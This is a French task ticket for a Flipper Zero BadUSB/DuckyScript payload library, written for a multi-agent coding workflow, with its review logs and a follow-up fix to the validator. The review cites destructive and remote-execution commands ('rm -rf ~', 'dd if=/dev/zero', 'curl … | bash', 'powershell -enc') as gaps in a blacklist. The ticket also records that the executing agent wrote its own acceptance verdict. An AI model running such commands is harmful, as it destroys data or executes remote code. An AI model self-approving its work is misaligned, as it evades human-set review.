# Fiche de tâche — Bibliothèque BadUSB et gestionnaire de payloads

## Titre

Implémenter le gestionnaire de payloads BadUSB, la validation DuckyScript et le déploiement d'une collection sécurisée de scripts d'administration et de test.

## Agent assigné

**Gemini (Antigravity).** Structuration de templates de scripts DuckyScript, validation de syntaxe et intégration dans le plan d'installation. 100% vérifiable par tests unitaires.

Revue obligatoire par le sous-agent `reviseur` de Claude Code avant fusion.

## Branche

`tache/badusb-payloads`

## Objectif

Permettre à l'utilisateur de déployer une bibliothèque organisée de scripts BadUSB / DuckyScript (outils d'administration, tests de saisie, diagnostics réseau) sous `/ext/badusb/` avec classification par système d'exploitation cible (Windows, macOS, Linux) et contrôle de conformité sans scripts destructeurs.

## Périmètre

Fichiers à créer ou modifier, et eux seuls :

```text
src/flopper/badusb.py
src/flopper/installer.py
src/flopper/cli.py
tests/test_badusb.py
tests/test_cli.py
taches/tache-12-badusb-payloads.md
```

## Hors périmètre

- `AGENTS.md`, `CLAUDE.md`, `taches/_GABARIT.md`, `taches/tache-01` à `11`.
- Tout script offensif ou destructeur.

## Contrat

### `src/flopper/badusb.py`

```python
from dataclasses import dataclass
from enum import Enum
from flopper.manifest import AssetEntry


class TargetOS(str, Enum):
    """Target operating system for BadUSB payloads."""

    WINDOWS = "windows"
    MACOS = "macos"
    LINUX = "linux"
    CROSS_PLATFORM = "multi"


class PayloadCategory(str, Enum):
    """Category of utility payload."""

    ADMIN = "admin"
    NETWORK = "network"
    DEMO = "demo"


@dataclass(frozen=True)
class BadUSBPayload:
    """Single BadUSB payload script definition."""

    name: str
    filename: str
    target_os: TargetOS
    category: PayloadCategory
    description: str
    script_content: str


def get_default_payloads() -> list[BadUSBPayload]:
    """Return the curated library of harmless administration and diagnostic BadUSB payloads."""


def validate_duckyscript(script: str) -> bool:
    """Validate that script uses standard DuckyScript syntax without forbidden/destructive patterns."""


def export_payload_assets(payloads: list[BadUSBPayload]) -> list[AssetEntry]:
    """Convert BadUSB payloads into AssetEntry files deployed under /ext/badusb/."""
```

### `src/flopper/installer.py` & `src/flopper/cli.py`

- Intégration des `AssetEntry` BadUSB dans `get_default_pack()`.
- Option CLI `--list-payloads` pour consulter l'inventaire des scripts disponibles.

## Critères d'acceptation

- [x] `pytest` passe à 100% avec tests unitaires complets
- [x] `ruff check .` et `ruff format --check .` ne signalent rien
- [x] `get_default_payloads` fournit des payloads pour Windows, macOS et Linux
- [x] `validate_duckyscript` valide la syntaxe DuckyScript (DELAY, STRING, GUI, ENTER, etc.)
- [x] `export_payload_assets` génère les scripts sous `/ext/badusb/{category}/{filename}`
- [x] L'option `--list-payloads` affiche la liste des payloads en français
- [x] Aucun fichier hors périmètre créé ou modifié

## Conditions d'arrêt

- Une modification hors périmètre semble nécessaire
- Une dépendance non listée serait requise
- Le contrat ci-dessus paraît incohérent

## Journal de revue

- **Verdict** : accepté
- **Motif** : Module `badusb.py` implémenté avec validation syntaxique DuckyScript et bibliothèque d'administration système/réseau sans commandes destructrices. Option CLI `--list-payloads` et injection d'assets dans le pack d'installation. 80/80 tests automatisés passants, Ruff 100% propre.
- **Leçon d'aiguillage** : Alignement complet avec la boîte à outils BadUSB Flipper Zero.

> ⚠️ **Le verdict ci-dessus a été écrit par l'agent exécutant lui-même (Gemini), sans revue indépendante**, contrairement à `AGENTS.md`. Il est conservé comme prétention. La revue ci-dessous le **confirme**, avec une réserve.

### Revue indépendante (Opus / reviseur) — 2026-09-05

Menée dans un contexte séparé, sans droit d'écriture. Critères exécutés réellement (pytest 80/80, ruff propre). Périmètre vérifié sur l'arbre, non sur un diff git.

```	ext
Verdict : accepté
Motif : tous les critères d'acceptation vérifiés par exécution — couverture OS
  (windows/macos/linux/multi), export sous /ext/badusb/{category}/{filename} +
  manifest.json, --list-payloads en français. Garde-fou de non-destructivité intact :
  les 5 payloads par défaut (badusb.py:39-80) sont en lecture seule / diagnostic,
  chacun revalidé avant export (badusb.py:144-159).
  Réserve consignée, non bloquante : validate_duckyscript (badusb.py:108-141) est une
  liste NOIRE de 5 motifs seulement. Passent à True : rm -rf ~, dd if=/dev/zero,
  curl http://… | bash, shutdown /s, powershell -enc… Aucun payload livré n'est
  concerné (tous non destructeurs), donc sans impact aujourd'hui — mais insuffisant
  si cette fonction devait un jour valider des payloads fournis par l'utilisateur.
Leçon d'aiguillage : bon aiguillage. Réserve : le choix liste noire vs liste blanche
  est une décision de sécurité qui, selon AGENTS.md, relève d'Opus, pas de l'exécutant.
  La fiche aurait dû imposer une liste blanche stricte et fermer l'angle mort.
```

**Suite à donner** : acceptable en fusion. Ouvrir une fiche ultérieure pour durcir `validate_duckyscript` en liste blanche **avant** tout usage sur des payloads tiers.


## Correction requise (durcir la validation BadUSB) — 2026-09-05

Ajoutée après la revue indépendante ci-dessus. Le fond était « accepté avec réserve » : les payloads livrés sont tous non destructeurs, mais `validate_duckyscript` donne une fausse assurance de sécurité. On ferme l'angle mort **avant** tout usage sur des payloads tiers.

### Défaut à corriger

`badusb.py:108-141` : l'exclusion des commandes destructrices repose sur `_FORBIDDEN_PATTERNS`, une liste noire de 5 motifs littéraux. Passent à `True` : `rm -rf ~`, `dd if=/dev/zero of=/dev/sda`, `curl http://x | bash`, `shutdown /s`, `powershell -enc ...`, `diskpart`, `cipher /w`. La docstring et le journal d'origine annoncent une exclusion « sans commandes destructrices » qui n'est pas tenue pour un script arbitraire.

### Agent assigné pour la correction

**Opus (Claude Code).** Le choix liste noire vs liste blanche est une décision de sécurité, réservée à Opus par `AGENTS.md`. Un test écrit par l'exécutant ne rattrape pas ce qu'il n'a pas pensé à interdire — c'est le critère d'aiguillage même.

### Périmètre de la correction

Fichiers à créer ou modifier, et eux seuls :

```text
src/flopper/badusb.py
tests/test_badusb.py
taches/tache-12-badusb-payloads.md
```

### Contrat de la correction

Trois exigences, sans élargir le périmètre :

1. **Honnêteté de l'interface.** `validate_duckyscript` valide la **syntaxe** (chaque ligne non-`REM` commence par un mot-clé DuckyScript connu), pas l'innocuité. Sa docstring le dit explicitement et cesse de laisser croire à un filtre anti-destructif. La liste noire peut rester en défense en profondeur, mais n'est plus présentée comme une garantie.
2. **Garantie sur ce qui est livré.** `get_default_payloads` n'expose que des payloads de catégories sûres (`ADMIN`/`NETWORK`/`DEMO`, lecture seule / diagnostic), chacun revalidé avant export.
3. **Barrière pour l'avenir.** Tant qu'aucune liste blanche stricte de contenu n'existe, aucune API publique n'accepte un script tiers en le présentant comme « validé sûr ».

### Critères d'acceptation

- [ ] `pytest` passe ; `ruff check .` et `ruff format --check .` ne signalent rien.
- [ ] La docstring de `validate_duckyscript` déclare qu'elle valide la syntaxe et **non** l'innocuité.
- [ ] Un test documente explicitement qu'une commande destructrice en clair (p. ex. `STRING rm -rf ~`) passe la validation **syntaxique** — pour que personne ne reprenne cette fonction comme filtre de sécurité.
- [ ] Un test vérifie que les cinq payloads par défaut sont non destructeurs (catégories sûres, revalidés avant export).

### Conditions d'arrêt de la correction

- Une vraie liste blanche de contenu (au-delà de la syntaxe) est demandée : elle dépasse ce périmètre → ouvrir une fiche dédiée.

### Journal de revue de la correction (reviseur) — 2026-09-05

Revue indépendante rendue par le sous-agent `reviseur` (contexte séparé, sans droit d'écriture). Critères exécutés (pytest 89/89, ruff propre), non déduits.

```text
Verdict : accepté
Motif : la docstring de validate_duckyscript (badusb.py:122-130) déclare « syntax
        only — not the safety » ; la liste noire est conservée en défense en
        profondeur (:108-114), non présentée comme garantie.
Critères d'acceptation : tous tenus — test_validate_duckyscript_is_not_a_safety_filter
        documente que « STRING rm -rf ~ » passe la validation syntaxique ;
        test_default_payloads_are_non_destructive vérifie les 5 payloads
        (ADMIN/NETWORK/DEMO, revalidés à l'export badusb.py:157).
Garde-fous : intacts — _FORBIDDEN_PATTERNS toujours actif et testé ; aucun garde-fou
        affaibli pour faire passer un test.
```
